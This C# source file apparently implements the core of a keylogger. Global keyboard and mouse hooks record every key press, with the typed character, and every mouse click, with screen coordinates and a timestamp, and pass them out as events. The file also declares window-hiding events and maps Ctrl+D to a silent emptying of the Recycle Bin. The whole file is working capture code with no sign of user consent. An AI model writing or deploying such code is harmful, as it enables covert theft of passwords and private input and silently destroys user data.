using EventHook;
using System;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;

namespace GlobalHooks
{
    class Hooks
    {
        private const string specialSymbolsPattern = "^[^a-zA-Zа-яА-Я]?$";

        public bool IsStarted
        {
            get; set;
        }

        public delegate void AddFromFile(string line);
        public delegate void ChangeVisable();
        public delegate void FabeMonitor();

        public event AddFromFile MauseHook;
        public event AddFromFile KeyBordHook;
        public event ChangeVisable Visable;
        public event FabeMonitor FabeMonitorEvent;

        const int SHERB_NOSOUND = 0x00000004;

        private bool LeftCtrlPressed;

        public Hooks()
        {
            MouseWatcher.OnMouseInput += (s, e) =>
            {
                if (IsMouseButtonClickEvent(e.Message.ToString()))
                {
                    MauseHook?.Invoke(GetMouseEventDescription(e));
                }
            };

            KeyboardWatcher.OnKeyInput += (s, e) =>
            {
                if (IsButtonDownEvent(e.KeyData.EventType.ToString()))
                {
                    KeyBordHook?.Invoke(GetKeyBordEventDescription(e.KeyData));
                    KeyCombinationAnalyzer(e.KeyData);
                }
            };
        }

        public void Start()
        {
            MouseWatcher.Start();
            KeyboardWatcher.Start();
            IsStarted = true;
        }

        public void Stop()
        {
            MouseWatcher.Stop();
            KeyboardWatcher.Stop();
            IsStarted = false;
        }

        private bool IsMouseButtonClickEvent(string message) =>
            (message.Equals("WM_LBUTTONDOWN") || message.Equals("WM_RBUTTONDOWN"));


        private bool IsButtonDownEvent(string message) =>
            message.Equals("down");


        private string GetMouseEventDescription(EventHook.MouseEventArgs e) =>
            DateTime.Now.ToString() + ": " + (e.Message.ToString().Equals("WM_LBUTTONDOWN") ? "left button " : "rihgt button ") + "(" + e.Point.x + "," + e.Point.y + ")\r\n";


        private string GetKeyBordEventDescription(KeyData e) =>
            DateTime.Now.ToString() + ": Key - " + GetKey(e) + "(" + e.EventType + ")\r\n";


        private string GetKey(KeyData keyData) =>
            (Regex.IsMatch(keyData.UnicodeCharacter, specialSymbolsPattern)) ?
                keyData.Keyname : keyData.UnicodeCharacter;

        private void KeyCombinationAnalyzer(KeyData key)
        {
            switch (key.Keyname)
            {
                case "LeftCtrl":
                    LeftCtrlPressed = true;
                    break;

                case "D":
                    if (LeftCtrlPressed)
                    {
                        SHEmptyRecycleBin(IntPtr.Zero, "", SHERB_NOSOUND);
                    }
                    break;

                default:
                    LeftCtrlPressed = false;
                    break;
            }
        }

        //API-функция очистки корзины
        [DllImport("shell32.dll")]
        static extern int SHEmptyRecycleBin(IntPtr hWnd, string pszRootPath, uint dwFlags);
    }
}